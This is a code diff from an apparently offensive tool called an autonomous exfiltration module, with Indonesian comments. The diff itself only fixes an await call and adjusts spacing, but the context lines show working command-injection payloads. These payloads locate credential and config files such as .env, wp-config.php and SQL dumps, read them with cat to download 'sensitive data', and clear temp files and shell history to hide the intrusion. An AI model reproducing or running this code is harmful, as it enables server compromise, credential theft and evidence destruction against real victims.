@@ -30,8 +30,8 @@ class AutonomousExfiltrationModule(BaseModule):
         
         # Pola pencarian file konfigurasi krusial standar industri
         search_cmd = "find . -name '.env' -o -name 'config.php' -o -name 'wp-config.php' -o -name '*.sql' 2>/dev/null"
-        payload_inline = f"/**/;/**/; {search_cmd} /**/;/**/"
-        headers = self.auditor._get_random_headers()
+        payload_inline = f"/**/;/**/; {search_cmd} /**/;/**/ "
+        headers = await self.auditor._get_random_headers()  # FIX: Added await
         
         try:
             if self.auditor.method == "POST":
@@ -58,8 +58,8 @@ class AutonomousExfiltrationModule(BaseModule):
         
         # Perintah taktis memanggil data mentah dari file jarak jauh
         read_cmd = f"cat {remote_file_path}"
-        payload_inline = f"/**/;/**/; {read_cmd} /**/;/**/"
-        headers = self.auditor._get_random_headers()
+        payload_inline = f"/**/;/**/; {read_cmd} /**/;/**/ "
+        headers = await self.auditor._get_random_headers()  # FIX: Added await
         
         try:
             print(f"[*] Exfil Engine V18.2: Mendownload data sensitif secara otonom -> {remote_file_path}")
@@ -88,8 +88,8 @@ class AutonomousExfiltrationModule(BaseModule):
         
         # Perintah kaku pembersihan log riwayat linux server
         wipe_cmd = "rm -f .tmp_v14_* .tmp_v17_* 2>/dev/null && history -c"
-        payload_inline = f"/**/;/**/; {wipe_cmd} /**/;/**/"
-        headers = self.auditor._get_random_headers()
+        payload_inline = f"/**/;/**/; {wipe_cmd} /**/;/**/ "
+        headers = await self.auditor._get_random_headers()  # FIX: Added await
         
         try:
             if self.auditor.method == "POST":
